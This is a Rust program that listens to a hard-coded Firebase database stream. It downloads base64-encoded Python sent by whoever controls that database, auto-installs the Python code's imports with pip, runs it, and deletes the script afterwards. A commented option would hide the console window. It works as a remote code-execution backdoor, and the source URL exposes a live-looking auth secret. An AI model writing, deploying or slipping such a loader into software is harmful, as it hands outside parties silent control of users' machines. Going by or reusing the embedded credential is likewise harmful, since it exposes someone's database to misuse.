// #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use base64::{Engine, engine::general_purpose};
use eventsource_client::Client;
use eventsource_client::ClientBuilder;
use futures_util::StreamExt;
use launchdarkly_sdk_transport::HyperTransport;
use rustpython_parser::Parse;
use rustpython_parser::ast::{Stmt, Suite};
use serde::Deserialize;
use std::fs::remove_file;
use std::fs::write;
use std::process::Command;
use std::time::Duration;

#[derive(Deserialize, Debug)]
#[allow(dead_code)]
struct Payload {
    path: String,
    data: serde_json::Value,
}

static URL: &'static str = "https://manas-gift-default-rtdb.firebaseio.com/payload.json?auth=kSkIQOpYpGISSMB4QxWZx3W7CDm2wabrC7fLQVC8";

#[tokio::main]
async fn main() {
    let transport = HyperTransport::builder()
        .connect_timeout(Duration::from_secs(10))
        .read_timeout(Duration::from_secs(30))
        .build_https()
        .unwrap();

    let client = ClientBuilder::for_url(URL)
        .unwrap()
        .build_with_transport(transport);

    let mut stream = client.stream();

    let mut first_received = false;
    let mut active = false;

    while let Some(event) = stream.next().await {
        if active {
            continue;
        }

        match event {
            Ok(eventsource_client::SSE::Event(e)) => {
                if !first_received {
                    first_received = true;
                    continue;
                }

                let payload: serde_json::Result<Payload> = serde_json::from_str(&e.data);
                if payload.is_err() {
                    println!(
                        "JSON deserialization error: {}\n{}",
                        payload.err().unwrap().to_string(),
                        e.data
                    );
                    continue;
                }

                let payload = payload.unwrap();

                let python_content = payload.data["pythonContent"].as_str();
                if python_content.is_none() {
                    println!("Missing `pythonContent` field in payload data");
                    continue;
                }

                let decoded = general_purpose::STANDARD.decode(python_content.unwrap());
                if decoded.is_err() {
                    println!("base64 decoding error");
                    continue;
                }

                let content = String::from_utf8(decoded.unwrap());
                if content.is_err() {
                    println!("utf8 conversion error");
                    continue;
                }

                let content = content.unwrap();
                println!("Received content:\n{}", content);
                
                active = true;

                let _ = run_python_function(&content);

                active = false;
            }
            Err(_) => {}
            _ => {}
        }
    }
}

fn run_command(command: &str, path: &str) -> Result<(), String> {
    let command = Command::new(command)
        .stdout(std::process::Stdio::inherit())
        .stderr(std::process::Stdio::inherit())
        .arg(path)
        .status();

    if command.is_err() {
        return Err(command.err().unwrap().to_string());
    } else {
        return Ok(());
    }
}

async fn run_python_function(source: &str) {
    let client = reqwest::Client::new();
    let body = serde_json::json!({ "pythonContent": "" });

    let response = client.patch(URL).json(&body).send().await;

    if response.is_err() {
        println!("Failed to send PATCH request: {}", response.err().unwrap().to_string());
        return;
    }

    let imports = get_imports(&source);
    if imports.is_err() {
        println!("Import parsing error");
        return;
    }

    let import_text = get_install_packages_text(imports.unwrap());

    let path = std::env::current_exe()
        .unwrap()
        .parent()
        .unwrap()
        .join("main.py");

    let path = path.to_str().unwrap();

    println!("Writing to file: {}", path);

    let file = write(path, format!("{}\n{}", import_text.as_str(), source));
    if file.is_err() {
        println!("File creation error: {}", file.err().unwrap().to_string());
        return;
    }

    let command = run_command("python", path);

    if command.is_err() {
        println!(
            "Python execution error. Attempting `python3`: {}",
            command.err().unwrap().to_string()
        );

        let command = run_command("python3", path);

        if command.is_err() {
            println!(
                "Python3 execution error: {}",
                command.err().unwrap().to_string()
            );
        }
    }

    let file_removal = remove_file(path);
    if file_removal.is_err() {
        println!(
            "File removal error: {}",
            file_removal.err().unwrap().to_string()
        );
    }
}

fn get_imports(source: &str) -> Result<Vec<String>, ()> {
    let statements = Suite::parse(source, "<embedded>");
    if statements.is_err() {
        return Err(());
    }

    let mut imports = Vec::<String>::new();

    for statement in statements.unwrap() {
        match statement {
            Stmt::Import(import_statement) => {
                let module = import_statement.names[0].name.to_string();
                let modules: Vec<&str> = module.split(".").collect();
                imports.push(modules[0].to_string());
            }
            Stmt::ImportFrom(import_from_statement) => {
                let module = import_from_statement.module.unwrap().to_string();
                let modules: Vec<&str> = module.split(".").collect();
                imports.push(modules[0].to_string());
            }
            _ => {}
        }
    }

    Ok(imports)
}

fn get_install_packages_text(imports: Vec<String>) -> String {
    format!(
        "import subprocess
import sys

packages = {:?}

to_install = [p for p in packages if p not in sys.stdlib_module_names]

if len(to_install) > 0:
    subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\", *to_install])
",
        imports
    )
}
